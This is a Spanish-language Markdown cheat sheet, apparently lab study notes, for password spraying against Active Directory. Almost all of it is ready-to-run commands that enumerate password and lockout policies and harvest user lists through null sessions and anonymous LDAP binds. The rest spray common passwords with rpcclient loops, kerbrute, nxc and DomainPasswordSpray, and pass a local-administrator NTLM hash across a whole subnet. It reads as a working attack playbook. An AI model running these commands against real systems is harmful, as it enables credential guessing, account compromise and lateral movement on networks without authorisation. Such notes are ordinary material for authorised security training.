#passwordSpraying
## Linux
### Enumerar política de contraseñas

- **`nxc` (SMB - 445):**
	```bash
	# Requiere credenciales
	nxc smb $target -u 'username' -p 'password!' --pass-pol
	```

- **`rpcclient` (SMB - 445, 139):**
	```bash
	rpcclient -U 'username%password' $target
	# o null session
	rpcclient -U "" -N $target
	# Una vez dentro, podemos obtener informacíon básica del dominio con
	rpcclient $> querydominfo
	# Obtener política de contraseñas
	rpcclient $> getdompwinfo
	```

- **`enum4linux` (SMB - 445, 139):**
	```bash
	enum4linux -P $target
	```
`-P` : password police
- **enum4linux-ng (SMB - 445, 139):**
	```bash
	# Con credenciales
	enum4linux-ng -P $target -u 'username' -p 'password!' -oA ilfreight
	# Null session
	enum4linux-ng -P $target -oA ilfreight
	```

- **ldapsearch (LDAP - 389, 636):**
	```bash
	# Con credenciales
	ldapsearch -h $target -D "CN=username,DC=INLANEFREIGHT,DC=LOCAL" -w 'password' -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
	# Anonymous bind
	ldapsearch -h $target -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
	```

### Crear User List

- **`enum4linux` (SMB - 445, 139):**
	```bash
	# Sin credenciales
	enum4linux -U $target | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
	# Con credenciales
	enum4linux -U -u <user> -p <pass> $target | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
	```

- **`rpcclient`:**
	```bash
	# sin credenciales
	rpcclient -U "" -N 172.16.5.5
	# Con credenciales
	rpcclient -U "username" 172.16.5.5
	# Una vez en sesión
	rpcclient $> enumdomusers
	```

- **`nxc` SMB ( `--users`):**
	```bash
	nxc smb $target -u <username> -p <password> --users
	```
	La flag `--users` nos indica el número de intentos fallidos y fecha de último intento fallido
- **`ldapsearch` ( Anonymous Bind):**
	```bash
	ldapsearch -h $target -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
	```

- **`windapsearch`:**
	```bash
	./windapsearch.py --dc-ip $target -u "" -U
	```

- **`Kerbrute`:**
	```bash
	kerbrute userenum -d inlanefreight.local --dc $target /opt/jsmith.txt
	# otra lista interesante: /usr/share/wordlists/dirb/others/names.txt
	```

### Ejecutar Password Spraying
- **One-liner bash (SMB - 445, 139):**
	```bash
	for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" $target | grep Authority; done
	```

- **Kerbrute (Kerberos - 88):**
	```bash
	kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
	```

- **nxc (SMB):**
	```bash
	sudo nxc smb $target -u valid_users.txt -p Password123 | grep +
	```

- **Local Admin Spraying:**
	```bash
	sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
	```
	
## Windows
### Enumerar política de contraseñas
- **Null Sessions (net use - 445, 139):**
	El siguiente comando muestra si acepta null sessions
	```
	net use \\DC01\ipc$ "" /u:""
	```
- **net.exe:**
	```powershell
	net accounts
	```
	Si  obtenemos el siguiente valor `Lockout threshold: Never` significa que podemos ejecutar fuerza bruta sin problema. 

- **Powerview:**
	```powershell
	import-module .\PowerView.ps1
	Get-DomainPolicy
	```

### Ejecutar Password Spraying
- **DomainPasswordSpray (Windows AD):**
	```powershell
	Import-Module .\DomainPasswordSpray.ps1
	Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
	```
